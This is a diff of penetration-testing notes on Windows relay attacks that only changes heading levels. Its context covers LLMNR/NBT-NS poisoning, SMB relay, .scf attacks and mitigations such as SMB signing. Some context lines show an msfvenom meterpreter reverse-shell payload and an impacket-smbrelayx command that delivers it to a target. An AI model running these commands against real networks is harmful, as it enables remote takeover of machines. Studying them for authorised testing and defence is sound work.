@@ -1,19 +1,19 @@
 # Relay attacks
 ---
-# Navigation
+## Navigation
 - **[Whats LLMNR](#whats-llmnr)**
 - **[SMB relay attack](#smb-relay-attack)**
 - **[SMB scf attack](#smb-scf-attack)**
 - **[Further reading](#further-reading)**
 ---
-# Whats LLMNR?
+## Whats LLMNR?
 **Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Microsoft Windows components that serve as alternate methods of host identification. **LLMNR is based upon the Domain Name System (DNS) format** and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.
 But this method of host resolution has severe security impact, as when a non-existing host is searched using LLMNR method, it **broadcasts** the search request to every system connected to the local network. As a result, **if any of the systems in local network is somehow compromised by an attacker, it also receives the host search query and can send a response to the victim** (the system which initiated the host resolution query) that it knows the host **and in turn ask for the password hash of the victim**.
 
 ![[LLMNR.png]]
 
 ---
-# SMB relay attack
+## SMB relay attack
 ## Definition
 SMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.
 Instead of cracking the NTLM hashes taken from the LLMNR poisoning attack or any other method we can authenticate using the hash using SMB relay attack but this requires two conditions:
@@ -56,7 +56,7 @@ New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name 
 2.  Enabling SMB signing can stop NTLMv2 relay attacks (note that this will increase traffic because of the additional processing for each packet) and also some printers may not support SMB singing. To turn on SMB signing you can do so through group policy by enabling “Microsoft network client: Digitally sign communication (always)”
 3.  Network segmentation is another way in which this can be mitigated because then the man in the middle attack is limited in scope. This can be achieved by segmenting the network through Vlans.
 ---
-# SMB .scf attack
+## SMB .scf attack
 SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to **access a specific UNC path** which allows the penetration tester to build an attack.
 > **A UNC path** is the path to a folder or file on a network and contains the server name in the path.
 ## Attack
@@ -85,7 +85,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=5555 -f ex
 impacket-smbrelayx -h Target-IP -e ./abuqasem.exe
 ```
 ---
-# Further reading
+## Further reading
 1. [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
 2.   [https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef](https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef)
 3.   [https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
